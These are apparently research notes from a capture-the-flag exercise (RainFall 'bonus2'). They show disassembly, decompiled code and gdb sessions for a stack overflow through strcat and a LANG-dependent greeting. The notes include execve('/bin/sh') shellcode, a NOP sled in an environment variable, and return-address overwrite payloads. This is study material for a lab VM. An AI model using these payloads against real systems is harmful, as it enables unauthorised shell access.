# Research notes

This is the working log, including experiments that did not succeed. The verified VM procedure is in `../walkthrough`. Addresses from local experiments may differ from the ISO VM.

```bash
pwndbg> pdisas main 70
 ► 0x8048529 <main>                             push   ebp
   0x804852a <main+1>                           mov    ebp, esp
   0x804852c <main+3>                           push   edi
   0x804852d <main+4>                           push   esi
   0x804852e <main+5>                           push   ebx
   0x804852f <main+6>                           and    esp, 0xfffffff0
   0x8048532 <main+9>                           sub    esp, 0xa0
   0x8048538 <main+15>                          cmp    dword ptr [ebp + 8], 3
   0x804853c <main+19>                     ┌<   je     main+31                     <main+31>
                                           │
   0x804853e <main+21>                     │    mov    eax, 1                     EAX => 1
   0x8048543 <main+26>                    ┌─<   jmp    main+263                    <main+263>
                                          ││
   0x8048548 <main+31>                    │└>   lea    ebx, [esp + 0x50]
   0x804854c <main+35>                    │     mov    eax, 0                         EAX => 0
   0x8048551 <main+40>                    │     mov    edx, 0x13                      EDX => 0x13
   0x8048556 <main+45>                    │     mov    edi, ebx
   0x8048558 <main+47>                    │     mov    ecx, edx                       ECX => 0x13
   0x804855a <main+49>                    │     rep stosd dword ptr es:[edi], eax
   0x804855c <main+51>                    │     mov    eax, dword ptr [ebp + 0xc]
   0x804855f <main+54>                    │     add    eax, 4
   0x8048562 <main+57>                    │     mov    eax, dword ptr [eax]
   0x8048564 <main+59>                    │     mov    dword ptr [esp + 8], 0x28
   0x804856c <main+67>                    │     mov    dword ptr [esp + 4], eax
   0x8048570 <main+71>                    │     lea    eax, [esp + 0x50]
   0x8048574 <main+75>                    │     mov    dword ptr [esp], eax
   0x8048577 <main+78>                    │     call   strncpy@plt                 <strncpy@plt>
                                          │
   0x804857c <main+83>                    │     mov    eax, dword ptr [ebp + 0xc]
   0x804857f <main+86>                    │     add    eax, 8
   0x8048582 <main+89>                    │     mov    eax, dword ptr [eax]
   0x8048584 <main+91>                    │     mov    dword ptr [esp + 8], 0x20
   0x804858c <main+99>                    │     mov    dword ptr [esp + 4], eax
   0x8048590 <main+103>                   │     lea    eax, [esp + 0x50]
   0x8048594 <main+107>                   │     add    eax, 0x28
   0x8048597 <main+110>                   │     mov    dword ptr [esp], eax
   0x804859a <main+113>                   │     call   strncpy@plt                 <strncpy@plt>
                                          │
   0x804859f <main+118>                   │     mov    dword ptr [esp], __do_global_ctors_aux+520
   0x80485a6 <main+125>                   │     call   getenv@plt                  <getenv@plt>
                                          │
   0x80485ab <main+130>                   │     mov    dword ptr [esp + 0x9c], eax
   0x80485b2 <main+137>                   │     cmp    dword ptr [esp + 0x9c], 0
   0x80485ba <main+145>                  ┌──<   je     main+239                    <main+239>
                                         ││
   0x80485bc <main+147>                  ││     mov    dword ptr [esp + 8], 2
   0x80485c4 <main+155>                  ││     mov    dword ptr [esp + 4], __do_global_ctors_aux+525
   0x80485cc <main+163>                  ││     mov    eax, dword ptr [esp + 0x9c]
   0x80485d3 <main+170>                  ││     mov    dword ptr [esp], eax
   0x80485d6 <main+173>                  ││     call   memcmp@plt                  <memcmp@plt>
                                         ││
   0x80485db <main+178>                  ││     test   eax, eax
   0x80485dd <main+180>                 ┌───<   jne    main+194                    <main+194>
                                        │││
   0x80485df <main+182>                 │││     mov    dword ptr [language], 1         [language] <= 1
   0x80485e9 <main+192>                ┌────<   jmp    main+239                    <main+239>
                                       ││││
   0x80485eb <main+194>                │└───>   mov    dword ptr [esp + 8], 2
   0x80485f3 <main+202>                │ ││     mov    dword ptr [esp + 4], __do_global_ctors_aux+528
   0x80485fb <main+210>                │ ││     mov    eax, dword ptr [esp + 0x9c]
   0x8048602 <main+217>                │ ││     mov    dword ptr [esp], eax
   0x8048605 <main+220>                │ ││     call   memcmp@plt                  <memcmp@plt>
                                       │ ││
   0x804860a <main+225>                │ ││     test   eax, eax
   0x804860c <main+227>               ┌─────<   jne    main+239                    <main+239>
                                      ││ ││
   0x804860e <main+229>               ││ ││     mov    dword ptr [language], 2                    [language] <= 2
   0x8048618 <main+239>               └└─└──>   mov    edx, esp
   0x804861a <main+241>                   │     lea    ebx, [esp + 0x50]
   0x804861e <main+245>                   │     mov    eax, 0x13                                  EAX => 0x13
   0x8048623 <main+250>                   │     mov    edi, edx
   0x8048625 <main+252>                   │     mov    esi, ebx
   0x8048627 <main+254>                   │     mov    ecx, eax                                   ECX => 0x13
   0x8048629 <main+256>                   │     rep movsd dword ptr es:[edi], dword ptr [esi]
   0x804862b <main+258>                   │     call   greetuser                   <greetuser>
                                          │
   0x8048630 <main+263>                   └─>   lea    esp, [ebp - 0xc]
   0x8048633 <main+266>                         pop    ebx
   0x8048634 <main+267>                         pop    esi
   0x8048635 <main+268>                         pop    edi
   0x8048636 <main+269>                         pop    ebp
   0x8048637 <main+270>                         ret

pwndbg> decomp main 26
    1 int __cdecl main(int argc, const char **argv, const char **envp)
    2 {
    3   char v4[76]; // [esp+0h] [ebp-ACh] BYREF
    4   char dest[76]; // [esp+50h] [ebp-5Ch] BYREF
    5   char *v6; // [esp+9Ch] [ebp-10h]
    6
 ►  7   if ( argc != 3 )
    8     return 1;
    9   memset(dest, 0, sizeof(dest));
   10   strncpy(dest, argv[1], 0x28u);
   11   strncpy(&dest[40], argv[2], 0x20u);
   12   v6 = getenv("LANG");
   13   if ( v6 )
   14   {
   15     if ( !memcmp(v6, "fi", 2u) )
   16     {
   17       language = 1;
   18     }
   19     else if ( !memcmp(v6, "nl", 2u) )
   20     {
   21       language = 2;
   22     }
   23   }
   24   qmemcpy(v4, dest, sizeof(v4));
   25   return greetuser(v4[0]);
   26 }

pwndbg> decomp greetuser 25
    1 int __cdecl greetuser(char src)
    2 {
    3   __int128 dest; // [esp+10h] [ebp-48h] BYREF
    4   __int16 v3; // [esp+20h] [ebp-38h]
    5   char v4; // [esp+22h] [ebp-36h]
    6
 ►  7   switch ( language )
    8   {
    9     case 1:
   10       *(_QWORD *)&dest = 0x20A4C3A4C3767948LL;
   11       *((_QWORD *)&dest + 1) = 0xC3A4C37669A4C370LL;
   12       v3 = unk_8048727;
   13       v4 = unk_8048729;
   14       break;
   15     case 2:
   16       strcpy((char *)&dest, "Goedemiddag! ");
   17       break;
   18     case 0:
   19       strcpy((char *)&dest, "Hello ");
   20       break;
   21   }
   22   strcat((char *)&dest, &src);
   23   return puts((const char *)&dest);
   24 }

```


```bash
bonus2@RainFall:~$ LANG=en ./bonus2 NAME SURNAME
Hello NAME
bonus2@RainFall:~$ LANG=fi ./bonus2 NAME SURNAME
Hyvää päivää NAME
bonus2@RainFall:~$ LANG=nl ./bonus2 NAME SURNAME
Goedemiddag! NAME

$ printf '31c050682f2f7368682f62696e89e3505389e1b00bcd800a' | xxd -r -p | pwn disasm
0:    31 c0                    xor    eax,  eax
2:    50                       push   eax
3:    68 2f 2f 73 68           push   0x68732f2f
8:    68 2f 62 69 6e           push   0x6e69622f
d:    89 e3                    mov    ebx,  esp
f:    50                       push   eax
10:    53                       push   ebx
11:    89 e1                    mov    ecx,  esp
13:    b0 0b                    mov    al,  0xb
15:    cd 80                    int    0x80
17:    0a                       .byte 0xa

export SC=$(printf '31c050682f2f7368682f62696e89e3505389e1b00bcd800a' | xxd -r -p)
export LANG=$(python2.7 -c 'print b"\x90"*500'; printf '31c050682f2f7368682f62696e89e3505389e1b00bcd80' | xxd -r -p)



export LANG="fi$(python2.7 -c 'print b"\x90"*500')$(printf '31c050682f2f7368682f62696e89e3505389e1b00bcd80' | xxd -r -p)"

set args $(python2.7 -c 'print "A"*40') $(python2.7 -c 'import struct; print "B"*37 + struct.pack("<I", 0xbffffd85)')

set args $(python2.7 -c 'print "A"*40') $(python2.7 -c 'import struct; print "B"*26 + struct.pack("<I", 0xbffff4e0) + struct.pack("<I", 0xbffffdb0)')

```


```bash
bonus2@RainFall:~$ env - LANG="fi$(python2.7 -c 'print b"\x90"*500')$(printf '31c050682f2f7368682f62696e89e3505389e1b00bcd80' | xxd -r -p)" gdb -q ./bonus2
Reading symbols from /home/user/bonus2/bonus2...(no debugging symbols found)...done.
(gdb) br *greetuser+164
Breakpoint 1 at 0x8048528
(gdb) set args $(python2.7 -c 'print "A"*40') $(python2.7 -c 'import struct; print "B"*14 + struct.pack("<I", 0xbffff4e0) + struct.pack("<I", 0xbfffff9a)')
(gdb) start
Temporary breakpoint 2 at 0x804852f
   0x804851f <greetuser+155>:	mov    DWORD PTR [esp],eax
   0x8048522 <greetuser+158>:	call   0x8048390 <puts@plt>
   0x8048527 <greetuser+163>:	leave
   0x8048528 <greetuser+164>:	ret
   0x8048529 <main>:	push   ebp
   0x804852a <main+1>:	mov    ebp,esp
   0x804852c <main+3>:	push   edi
   0x804852d <main+4>:	push   esi
   0x804852e <main+5>:	push   ebx
=> 0x804852f <main+6>:	and    esp,0xfffffff0
   0x8048532 <main+9>:	sub    esp,0xa0
   0x8048538 <main+15>:	cmp    DWORD PTR [ebp+0x8],0x3
   0x804853c <main+19>:	je     0x8048548 <main+31>
   0x804853e <main+21>:	mov    eax,0x1
   0x8048543 <main+26>:	jmp    0x8048630 <main+263>
   0x8048548 <main+31>:	lea    ebx,[esp+0x50]

Temporary breakpoint 2, 0x0804852f in main ()
(gdb) p (*(*(char ***)($fp + 16))) @ 5
$1 =   {
  [0] = 0xbffffda5 "COLUMNS=231",
  [1] = 0xbffffdb1 "LANG=fi\220\220\220\220\220\220"...,
  [2] = 0xbfffffc4 "PWD=/home/user/bonus2",
  [3] = 0xbfffffda "LINES=57",
  [4] = 0x0
}
(gdb) c
Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBB��������
   0x8048518 <greetuser+148>:	push   esp
   0x8048519 <greetuser+149>:	(bad)
   0x804851a <greetuser+150>:	(bad)
   0x804851b <greetuser+151>:	dec    DWORD PTR [ebp+0x489b845]
   0x8048521 <greetuser+157>:	and    al,0xe8
   0x8048523 <greetuser+159>:	imul   edi,esi,0xc3c9ffff
   0x8048529 <main>:	push   ebp
   0x804852a <main+1>:	mov    ebp,esp
   0x804852c <main+3>:	push   edi
   0x804852d <main+4>:	push   esi
   0x804852e <main+5>:	push   ebx
   0x804852f <main+6>:	and    esp,0xfffffff0
   0x8048532 <main+9>:	sub    esp,0xa0
   0x8048538 <main+15>:	cmp    DWORD PTR [ebp+0x8],0x3
   0x804853c <main+19>:	je     0x8048548 <main+31>
   0x804853e <main+21>:	mov    eax,0x1

Breakpoint 1, 0x08048528 in greetuser ()
(gdb) i f
Stack level 0, frame at 0xbffffb10:
 eip = 0x8048528 in greetuser; saved eip 0xbfffff9a
 called by frame at 0xbffff4e8
 Arglist at 0xbffff4e0, args:
 Locals at 0xbffff4e0, Previous frame's sp is 0xbffffb10
 Saved registers:
  eip at 0xbffffb0c
```


```bash
set $ac = *(int *)($fp + 8)
set $av = *(char ***)($fp + 12)

p *$av @ ($ac + 1)


(gdb) set $av = *(char ***)($fp + 12)
(gdb) p/s $av
$5 = (char **) 0xbffff834
(gdb) p/s *$av
$6 = 0xbffff94e "/home/user/bonus2/bonus2"
(gdb) p/s $av[1]
$7 = 0xbffff967 "AAAA"
(gdb) p/s $av[2]
$8 = 0xbffff96c "BBBB"

exxport SC=$(printf '31c050682f2f7368682f62696e89e3505389e1b00bcd80' | xxd -r -p)
env -i LANG="fi$(python2.7 -c 'print b"\x90"*500')${SC}" \
  ./bonus2 $(python2.7 -c 'print "A"*40') \
  $(python2.7 -c 'import struct; print "B"*14 + struct.pack("<I", 0xbffff4e0) + struct.pack("<I", 0xbfffff9a)')
```
